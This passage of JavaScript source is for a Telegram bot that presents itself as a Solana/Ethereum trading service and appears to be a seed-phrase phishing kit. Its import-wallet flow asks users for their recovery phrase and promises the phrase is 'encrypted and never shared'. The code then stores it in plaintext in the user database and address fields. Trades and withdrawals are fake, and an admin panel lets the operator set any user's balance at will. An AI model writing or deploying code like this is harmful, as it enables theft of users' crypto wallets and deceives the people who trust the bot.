    `⚠️ *Confirm Wipe*\n\n` +
    `About to delete *${count}* user(s) from the database:\n` +
    `IDs: ${ids}\n\n` +
    `This cannot be undone!`,
    { reply_markup: confirmKeyboard.reply_markup }
  );
});

bot.action("admin:wipe:cancel", (ctx) => {
  return ctx.editMessageReplyMarkup({ inline_keyboard: [] });
});

bot.action("admin:wipe:confirm", async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.answerCbQuery("❌ Unauthorized");
  }
  const beforeCount = registeredUsers.size;
  const deletedIds = Array.from(registeredUsers.keys());
  registeredUsers.clear();
  registeredUsers.set(999001, { userId: 999001, username: "mockuser", email: "mock@example.com", pin: "1234", address: MOCK_WALLET, ethAddress: MOCK_ETH_ADDRESS, solBalance: 2.5, ethBalance: 0.8, usdcBalance: 150, registeredAt: new Date().toISOString(), lastActive: new Date().toISOString(), securityCompleted: true, tradeHistory: [{ type: "buy", token: "SOL", amount: 1.2, usdValue: 150, price: 152.3, timestamp: new Date().toISOString() }, { type: "sell", token: "SOL", amount: 0.5, usdcValue: 75, price: 152.3, timestamp: new Date().toISOString() }], copyTrades: [{ traderId: "trader1", traderName: "@alpha_trader", trade: { action: "BUY", token: "SOL", amount: 500, entry: 152.3, target: 165, stopLoss: 145 }, timeframe: "24h", timestamp: new Date().toISOString() }], stakingPositions: [{ token: "SOL", amount: 1.0, timestamp: new Date().toISOString() }], dcaPlans: [], settings: { slippage: false, autoBuy: false, mevProtection: false }, signalStrength: 85 });
  sessions.clear();
  if (mongoCollection) {
    try {
      await mongoCollection.deleteMany({});
      await saveUsers();
      debugLog.push({ time: new Date().toISOString(), action: "all users wiped from mongodb", count: beforeCount });
    } catch (e) {
      console.error("Failed to wipe MongoDB:", e?.message || e);
      debugLog.push({ time: new Date().toISOString(), action: "mongodb wipe failed", error: e?.message || e?.toString() });
    }
  } else {
    saveUsers();
  }
  ctx.reply(`✅ Wiped ${beforeCount} user(s) from the database: ${deletedIds.join(", ")}. Mock user re-seeded.`);
  await ctx.answerCbQuery();
});

bot.command("admin reload", async (ctx) => {
  if (!isAdmin(ctx.from.id)) {
    return ctx.reply("❌ You are not authorized to view this page.");
  }
  if (!mongoCollection) {
    return ctx.reply("❌ MongoDB not connected. Cannot reload.");
  }
  const beforeCount = registeredUsers.size;
  await loadUsers();
  const afterCount = registeredUsers.size;
  ctx.reply(`✅ Reloaded users from MongoDB.\nBefore: ${beforeCount} users\nAfter: ${afterCount} users`);
});

bot.on("text", async (ctx) => {
  const state = getState(ctx);
  const text = (ctx.text ?? "").trim();
  const chatId = ctx?.chat?.id;

  // Handle admin input mode
  debugLog.push({ time: new Date().toISOString(), action: "text handler admin states check", adminStateCount: adminStates.size, chatId: ctx?.chat?.id, fromId: ctx?.from?.id, text: text.substring(0, 50) });
  for (const [targetId, adminState] of adminStates.entries()) {
    if (adminState.chatId === ctx.chat?.id && isAdmin(ctx.from.id)) {
      const user = registeredUsers.get(targetId);
      if (!user) {
        adminStates.delete(targetId);
        return ctx.reply("❌ User not found.");
      }
      const action = adminState.action;
      adminStates.delete(targetId);
      if (action === "pin") {
        if (!/^\d{4}$/.test(text)) {
          return ctx.reply("❌ PIN must be 4 digits. Please try again.");
        }
        user.pin = text;
        user.lastActive = new Date().toISOString();
        if (sessions.has(targetId)) {
          sessions.get(targetId).pin = text;
        }
        saveUsers();
        return ctx.reply(`✅ PIN updated for @${user.username || "unknown"} (ID: ${targetId}).`);
      }
      if (action === "email") {
        if (!text.includes("@")) {
          return ctx.reply("❌ Invalid email. Please try again.");
        }
        user.email = text;
        user.lastActive = new Date().toISOString();
        if (sessions.has(targetId)) {
          sessions.get(targetId).email = text;
        }
        saveUsers();
        return ctx.reply(`✅ Email updated for @${user.username || "unknown"} (ID: ${targetId}).`);
      }
      if (action === "balance") {
        const amount = parseFloat(text);
        if (isNaN(amount)) {
          return ctx.reply("❌ Invalid amount. Please enter a number.");
        }
        const solBalance = amount / SOL_PRICE;
        const ethBalance = amount / ETH_PRICE;
        const usdcBalance = amount;
        user.solBalance = solBalance;
        user.ethBalance = ethBalance;
        user.usdcBalance = usdcBalance;
        user.lastActive = new Date().toISOString();
        if (sessions.has(targetId)) {
          const s = sessions.get(targetId);
          s.solBalance = solBalance;
          s.ethBalance = ethBalance;
          s.usdcBalance = usdcBalance;
          syncState(s);
        }
        saveUsers();
        return ctx.reply(`✅ Balance updated for @${user.username || "unknown"} (ID: ${targetId}):\n💵 SOL: $${amount}\n💵 ETH: $${amount}\n💵 USDC: $${amount}`);
      }
      if (action === "soladdr") {
        user.address = text;
        user.lastActive = new Date().toISOString();
        if (sessions.has(targetId)) {
          sessions.get(targetId).address = text;
        }
        saveUsers();
        return ctx.reply(`✅ SOL address updated for @${user.username || "unknown"} (ID: ${targetId}).`);
      }
      if (action === "ethaddr") {
        user.ethAddress = text;
        user.lastActive = new Date().toISOString();
        if (sessions.has(targetId)) {
          sessions.get(targetId).ethAddress = text;
        }
        saveUsers();
        return ctx.reply(`✅ ETH address updated for @${user.username || "unknown"} (ID: ${targetId}).`);
      }
      if (action === "signal") {
        const sig = parseFloat(text);
        if (isNaN(sig) || sig < 0 || sig > 100) {
          return ctx.reply("❌ Invalid signal strength. Must be a number between 0-100.");
        }
        user.signalStrength = sig;
        user.lastActive = new Date().toISOString();
        if (sessions.has(targetId)) {
          sessions.get(targetId).signalStrength = sig;
        }
        saveUsers();
        return ctx.reply(`✅ Signal strength updated for @${user.username || "unknown"} (ID: ${targetId}): ${sig}`);
      }
      if (action === "username") {
        user.username = text;
        user.lastActive = new Date().toISOString();
        saveUsers();
        return ctx.reply(`✅ Username updated for ID: ${targetId} -> @${text}`);
      }
    }
  }

  if (state.awaitingImportWallet && state.currentView === "import_wallet_phrase") {
    await deleteUserMessage(ctx);
    const words = text.trim().split(/\s+/).filter(w => w.length > 0);
    if (words.length >= 12 && words.length <= 24) {
      const network = state.importWalletNetwork;
      const walletType = state.importWalletType;
      state.awaitingImportWallet = false;
      state.importWalletPhrase = text.trim();
      state.importWalletNetwork = null;
      state.importWalletType = null;
      state.currentView = "wallet_imported";
      
      // Save imported wallet info to user state
      if (network === "solana") {
        state.address = `Imported: ${walletType} (${state.importWalletPhrase})`;
      } else {
        state.ethAddress = `Imported: ${walletType} (${state.importWalletPhrase})`;
      }
      
      // Persist to database
      if (state.userId && registeredUsers.has(state.userId)) {
        const user = registeredUsers.get(state.userId);
        user.importedWalletPhrase = state.importWalletPhrase;
        user.importedWalletNetwork = network;
        user.importedWalletType = walletType;
        if (network === "solana") {
          user.address = `Imported: ${walletType} (${state.importWalletPhrase})`;
        } else {
          user.ethAddress = `Imported: ${walletType} (${state.importWalletPhrase})`;
        }
        user.lastActive = new Date().toISOString();
        saveUsers();
      }
      
      return replyWithCachedPhoto(ctx, "wallet", {
        caption: `✅ <b>Wallet Imported Successfully!</b>\n\n<i>Your ${walletType || "wallet"} has been imported on ${network === "solana" ? "Solana" : "Ethereum"}.</i>`,
        parse_mode: "HTML",
        reply_markup: dashboardKeyboard().reply_markup,
      });
    }
    return replyWithCachedPhoto(ctx, "network", {
      caption: `❌ <b>Invalid Recovery Phrase</b>\n\nPlease enter 12-24 words. You entered ${words.length} words.\n\n<i>your phrase is encrypted and never shared</i>`,
      parse_mode: "HTML",
      reply_markup: { remove_keyboard: true },
    });
  }

  if (state.awaitingEmail) {
    await deleteUserMessage(ctx);
    if (text.includes("@")) {
      state.email = text;
      state.awaitingEmail = false;
      state.awaitingPin = true;
      return replyWithCachedPhoto(ctx, "email", {
        caption:
          "✅ **Email saved securely**\n\n" +
          `📧 \`${text}\`\n\n` +
          "🔐 **Now set your 4-digit PIN for withdrawals.**\n\n" +
          "_Enter a 4-digit number (message will be auto-deleted for security):_",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (chatId !== undefined) {
      return sendPhotoCached(chatId, "security", {
        caption: SECURITY_SETUP_TEXT,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    return;
  }

  if (state.awaitingPin) {
    await deleteUserMessage(ctx);
    if (/^\d{4}$/.test(text)) {
      state.pin = text;
      state.awaitingPin = false;
      state.awaitingPinConfirm = true;
      return replyWithCachedPhoto(ctx, "pin", {
        caption: PIN_CONFIRM_TEXT,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    return replyWithCachedPhoto(ctx, "pin", {
      caption: PIN_PROMPT_TEXT,
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
  }

  if (state.awaitingPinConfirm) {
    await deleteUserMessage(ctx);
    if (/^\d{4}$/.test(text) && text === state.pin) {
      state.awaitingPinConfirm = false;
      state.securityCompleted = true;
      registerUser(state);
      return replyWithCachedPhoto(ctx, "dashboard", {
        caption: SECURITY_COMPLETE_TEXT(state),
        parse_mode: "Markdown",
        reply_markup: securityCompleteKeyboard().reply_markup,
      });
    }
    if (/^\d{4}$/.test(text)) {
      return replyWithCachedPhoto(ctx, "pin", {
        caption: PIN_MISMATCH_TEXT,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    return replyWithCachedPhoto(ctx, "pin", {
      caption: PIN_CONFIRM_TEXT,
      parse_mode: "Markdown",
      reply_markup: backKeyboard().reply_markup,
    });
   }

if (/^\/start\b/.test(text)) {
      state.awaitingEmail = false;
      state.awaitingPin = false;
      state.awaitingPinConfirm = false;
      state.awaitingSwapAmount = false;
      state.swapPair = null;
      state.awaitingWithdrawAmount = false;
      state.withdrawToken = null;
      state.awaitingStakeAmount = false;
      state.stakeToken = null;
      state.buyToken = null;
      state.sellToken = null;
      state.currentView = null;
      state.pendingAction = null;
      state.selectedTrader = null;
      return replyWithCachedPhoto(ctx, "welcome", {
        caption: WELCOME_TEXT,
        parse_mode: "Markdown",
        reply_markup: welcomeKeyboard().reply_markup,
      });
    }

    const navHandler = dispatchNav(text, state);
    if (navHandler) {
      state.awaitingSwapAmount = false;
      state.swapPair = null;
      state.awaitingWithdrawAmount = false;
      state.withdrawToken = null;
      state.awaitingStakeAmount = false;
      state.stakeToken = null;
      return navHandler(ctx);
    }

if (!state.securityCompleted) {
      return replyWithCachedPhoto(ctx, "welcome", {
        caption: WELCOME_TEXT,
        parse_mode: "Markdown",
        reply_markup: welcomeKeyboard().reply_markup,
      });
    }

    if (state.awaitingSwapAmount) {
    await deleteUserMessage(ctx);
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      return replyWithCachedPhoto(ctx, "swap", {
        caption: "❌ *Invalid amount.*\n\nPlease enter a valid number in USD.",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.swapPair === "sol-eth") {
      const solUsd = state.solBalance * SOL_PRICE;
      if (amount > solUsd) {
        return replyWithCachedPhoto(ctx, "swap", {
          caption:
            "❌ *Insufficient SOL balance.*\n\n" +
            `💵 You have: $${solUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
       state.awaitingSwapAmount = false;
       state.swapPair = null;
       const solBefore = solUsd;
       state.solBalance -= amount / SOL_PRICE;
       state.ethBalance += (amount * 0.85) / ETH_PRICE;
      state.tradeHistory.push({
        type: "swap",
        from: "SOL",
        to: "ETH",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      syncState(state);
      return replyWithCachedPhoto(ctx, "swap", {
        caption:
          "✅ *Swap Successful (Mock)*\n\n" +
          `🔄 Swapped $${amount.toFixed(2)} USD of SOL → ETH\n` +
          `💵 SOL balance: ${(state.solBalance * SOL_PRICE).toFixed(2)}\n` +
          `💵 ETH balance: ${(state.ethBalance * ETH_PRICE).toFixed(2)} (est.)\n\n`,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.swapPair === "eth-sol") {
    const ethUsd = 0;
      if (amount > ethUsd) {
        return replyWithCachedPhoto(ctx, "swap", {
          caption:
            "❌ *Insufficient ETH balance.*\n\n" +
            `💵 You have: $${ethUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
       state.awaitingSwapAmount = false;
       state.swapPair = null;
       const ethBefore = ethUsd;
       state.ethBalance -= amount / ETH_PRICE;
       state.solBalance += (amount * 1.15) / SOL_PRICE;
      state.tradeHistory.push({
        type: "swap",
        from: "ETH",
        to: "SOL",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      syncState(state);
      return replyWithCachedPhoto(ctx, "swap", {
        caption:
          "✅ *Swap Successful (Mock)*\n\n" +
          `🔄 Swapped $${amount.toFixed(2)} USD of ETH → SOL\n` +
          `💵 ETH balance: ${(state.ethBalance * ETH_PRICE).toFixed(2)}\n` +
          `💵 SOL balance: ${(state.solBalance * SOL_PRICE).toFixed(2)} (est.)\n\n`,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
  }

  if (state.awaitingWithdrawAmount) {
    await deleteUserMessage(ctx);
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      return replyWithCachedPhoto(ctx, "withdraw", {
        caption: "❌ *Invalid amount.*\n\nPlease enter a valid number in USD.",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.withdrawToken === "sol") {
      const solUsd = state.solBalance * SOL_PRICE;
      if (amount > solUsd) {
        return replyWithCachedPhoto(ctx, "withdraw", {
          caption:
            "❌ *Insufficient SOL balance.*\n\n" +
            `💵 You have: $${solUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_margin: undefined,
          reply_markup: backKeyboard().reply_markup,
        });
      }
       state.awaitingWithdrawAmount = false;
       state.withdrawToken = null;
       state.solBalance -= amount / SOL_PRICE;
      state.tradeHistory.push({
        type: "withdraw",
        token: "SOL",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      syncState(state);
      return replyWithCachedPhoto(ctx, "withdraw", {
        caption:
          "✅ *Withdraw Successful (Mock)*\n\n" +
          `💸 Withdrew $${amount.toFixed(2)} USD to external wallet\n` +
          `💵 Remaining SOL balance: $${(state.solBalance * SOL_PRICE).toFixed(2)}\n\n`,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.withdrawToken === "eth") {
      const ethUsd = 0;
      if (amount > ethUsd) {
        return replyWithCachedPhoto(ctx, "withdraw", {
          caption:
            "❌ *Insufficient ETH balance.*\n\n" +
            `💵 You have: $${ethUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
       state.awaitingWithdrawAmount = false;
       state.withdrawToken = null;
       state.ethBalance -= amount / ETH_PRICE;
      state.tradeHistory.push({
        type: "withdraw",
        token: "ETH",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      syncState(state);
      return replyWithCachedPhoto(ctx, "withdraw", {
        caption:
          "✅ *Withdraw Successful (Mock)*\n\n" +
          `💸 Withdrew $${amount.toFixed(2)} USD to external wallet\n` +
          `💵 Remaining ETH balance: $${(state.ethBalance * ETH_PRICE).toFixed(2)}\n\n`,
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
  }

  if (state.awaitingStakeAmount) {
    await deleteUserMessage(ctx);
    const amount = parseFloat(text);
    if (isNaN(amount) || amount <= 0) {
      return replyWithCachedPhoto(ctx, "stake", {
        caption: "❌ *Invalid amount.*\n\nPlease enter a valid number in USD.",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.stakeToken === "sol") {
      const solUsd = state.solBalance * SOL_PRICE;
      if (amount > solUsd) {
        return replyWithCachedPhoto(ctx, "stake", {
          caption:
            "❌ *Insufficient SOL balance.*\n\n" +
            `💵 You have: $${solUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingStakeAmount = false;
      state.stakeToken = null;
      state.solBalance -= amount / SOL_PRICE;
      state.stakingPositions.push({
        token: "SOL",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      state.tradeHistory.push({
        type: "stake",
        token: "SOL",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      syncState(state);
      return replyWithCachedPhoto(ctx, "stake", {
        caption:
          "✅ *Stake Successful (Mock)*\n\n" +
          `💎 Staked $${amount.toFixed(2)} USD of SOL\n` +
          `💵 Remaining SOL balance: $${(state.solBalance * SOL_PRICE).toFixed(2)}\n` +
          "🔒 Your staked SOL is locked for 7 days.\n\n",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
    if (state.stakeToken === "eth") {
      const ethUsd = 0;
      if (amount > ethUsd) {
        return replyWithCachedPhoto(ctx, "stake", {
          caption:
            "❌ *Insufficient ETH balance.*\n\n" +
            `💵 You have: $${ethUsd.toFixed(2)}\n` +
            `💵 Required: $${amount.toFixed(2)}\n\n` +
            "Please enter a lower amount.",
          parse_mode: "Markdown",
          reply_markup: backKeyboard().reply_markup,
        });
      }
      state.awaitingStakeAmount = false;
      state.stakeToken = null;
      state.ethBalance -= amount / ETH_PRICE;
      state.stakingPositions.push({
        token: "ETH",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      state.tradeHistory.push({
        type: "stake",
        token: "ETH",
        amount: amount,
        timestamp: new Date().toISOString(),
      });
      syncState(state);
      return replyWithCachedPhoto(ctx, "stake", {
        caption:
          "✅ *Stake Successful (Mock)*\n\n" +
          `💎 Staked $${amount.toFixed(2)} USD of ETH\n` +
          `💵 Remaining ETH balance: $${(state.ethBalance * ETH_PRICE).toFixed(2)}\n` +
          "🔒 Your staked ETH is locked for 7 days.\n\n",
        parse_mode: "Markdown",
        reply_markup: backKeyboard().reply_markup,
      });
    }
   }

   return replyWithCachedPhoto(ctx, "dashboard", {
     caption: DASHBOARD_TEXT(state),
     parse_mode: "Markdown",
     reply_markup: dashboardKeyboard(state).reply_markup,
   });
 });

bot.catch((err, ctx) => {
  console.error(`Error for ${ctx?.update?.update_id}:`, err?.message || err);
  if (ctx?.chat?.id) {
    ctx.reply("Sorry, I encountered an error processing your request. Please try again.").catch(e => console.error("Fallback reply failed:", e?.message));
  }
});

const BOT_PROFILE_NAME = "Sol Trading Bot";
const BOT_SHARE_DESCRIPTION = "you can contact @soltrading_helper_bot right away.";

const safeApiCall = async (fn, retries = 2, delay = 5000) => {
  const maxDelay = 60000;
  try {
    return await fn();
  } catch (err) {
    if (err.message && err.message.includes("429") && retries > 0) {
      const match = err.message.match(/retry after (\d+)/i);
      const waitMs = Math.min(match ? parseInt(match[1]) * 1000 : delay, maxDelay);
      console.log(`Rate limited. Waiting ${waitMs}ms before retry (${retries} left)...`);
      await new Promise(r => setTimeout(r, waitMs));
      return safeApiCall(fn, retries - 1, delay);
    }
    console.error("⚠️  API call failed:", err?.message || err);
    return null;
  }
};

async function configureProfile() {
  const maxDelay = 60000;
  await safeApiCall(() => bot.telegram.setMyName(BOT_PROFILE_NAME), 2, maxDelay);
  await safeApiCall(() => bot.telegram.setMyShortDescription(BOT_SHARE_DESCRIPTION), 2, maxDelay);
  console.log("✅ Bot profile configured for rich link previews.");
}

function startWithRetry() {
  const isProduction = process.env.NODE_ENV === "production" || process.env.RENDER || process.env.FLY_APP_NAME || process.env.CPANEL;
  const hasWebhookUrl = process.env.WEBHOOK_URL && !process.env.RENDER;

  if (hasWebhookUrl) {
    const webhookBase = process.env.WEBHOOK_URL;
    const webhookPath = "/webhook";
    const fullWebhookUrl = webhookBase + webhookPath;
    safeApiCall(() => bot.telegram.setWebhook(fullWebhookUrl)).then((result) => {
      if (result) {
        startupInfo.mode = "webhook";
        startupInfo.webhookUrl = fullWebhookUrl;
        console.log("🚀 Bot started with webhook mode!");
        console.log("🔗 Webhook URL: " + fullWebhookUrl);
        configureProfile().catch(e => console.error("Profile config failed:", e?.message));
      } else {
        console.log("⚠️  Webhook setup failed, falling back to polling.");
        launchPolling();
      }
    }).catch(() => launchPolling());
  } else {
    console.log("⚠️  Using polling mode for deployment.");
    launchPolling();
  }
}

function isConflict(err) {
  return (
    err instanceof Error &&
    /409|Conflict: terminated by other getUpdates request/.test(err.message)
  );
}

function launchPolling() {
  startupInfo.mode = "polling";
  bot.launch({ dropPendingUpdates: true }).then(() => {
    retryCount = 0;
    console.log("🚀 Bot is online with polling!");
  }).catch((err) => {
    console.error("❌ Bot launch failed:", err?.message || err);
    if (retryCount < MAX_RETRIES) {
      retryCount++;
      setTimeout(launchPolling, RETRY_DELAY_MS);
    }
  });
  bot.catch((err, ctx) => {
    console.error("❌ Bot error:", err?.message || err);
    debugLog.push({ time: new Date().toISOString(), action: "bot error", error: err?.message || err?.toString(), path: ctx?.update?.type });
    if (isConflict(err) && retryCount < MAX_RETRIES) {
      retryCount++;
      setTimeout(launchPolling, RETRY_DELAY_MS);
    }
  });
}

const MAX_RETRIES = 5;
const RETRY_DELAY_MS = 3000;
let retryCount = 0;

startWithRetry();

process.on("unhandledRejection", (err) => {
  console.error("⚠️  Unhandled rejection:", err);
});

const gracefulShutdown = async () => {
  try {
    await bot.stop();
    console.log("Gracefully stopped bot");
  } catch (e) {
    // Bot might not be running
  }
  process.exit(0);
};

process.once("SIGINT", gracefulShutdown);
process.once("SIGTERM", gracefulShutdown);

exports.bot = bot;
exports.SOL_PRICE = SOL_PRICE;
exports.ETH_PRICE = ETH_PRICE;
exports.MOCK_TRADERS = MOCK_TRADERS;
exports.WELCOME_TEXT = WELCOME_TEXT;
exports.NETWORK_TEXT = NETWORK_TEXT;
exports.walletAssignedText = walletAssignedText;
exports.SECURITY_SETUP_TEXT = SECURITY_SETUP_TEXT;
exports.PIN_PROMPT_TEXT = PIN_PROMPT_TEXT;
exports.PIN_CONFIRM_TEXT = PIN_CONFIRM_TEXT;
exports.DASHBOARD_TEXT = DASHBOARD_TEXT;
exports.NETWORK_GRID_TEXT = NETWORK_GRID_TEXT;
exports.SECURITY_COMPLETE_TEXT = SECURITY_COMPLETE_TEXT;
exports.PIN_MISMATCH_TEXT = PIN_MISMATCH_TEXT;
exports.welcomeKeyboard = welcomeKeyboard;
exports.networkKeyboard = networkKeyboard;
exports.dashboardKeyboard = dashboardKeyboard;
exports.buyKeyboard = buyKeyboard;
exports.buyTokenKeyboard = buyTokenKeyboard;
exports.sellKeyboard = sellKeyboard;
exports.sellTokenKeyboard = sellTokenKeyboard;
exports.settingsKeyboard = settingsKeyboard;
exports.mainMenuKeyboard = mainMenuKeyboard;
exports.backKeyboard = backKeyboard;
exports.securityCompleteKeyboard = securityCompleteKeyboard;
exports.swapPairKeyboard = swapPairKeyboard;
exports.withdrawTokenKeyboard = withdrawTokenKeyboard;
exports.stakeTokenKeyboard = stakeTokenKeyboard;
exports.dcaKeyboard = dcaKeyboard;
exports.alertsKeyboard = alertsKeyboard;
exports.buyTokenKeyboard = buyTokenKeyboard;
exports.sellTokenKeyboard = sellTokenKeyboard;
exports.handleBuyToken = handleBuyToken;
exports.handleBuyAmount = handleBuyAmount;
exports.handleSellToken = handleSellToken;
exports.copyTradersKeyboard = copyTradersKeyboard;
exports.copyTradeKeyboard = copyTradeKeyboard;
exports.getState = getState;
exports.registeredUsers = registeredUsers;
exports.registerUser = registerUser;
exports.ADMIN_ID = ADMIN_ID;
exports.syncState = syncState;
exports.isAdmin = isAdmin;
exports.adminStates = adminStates;
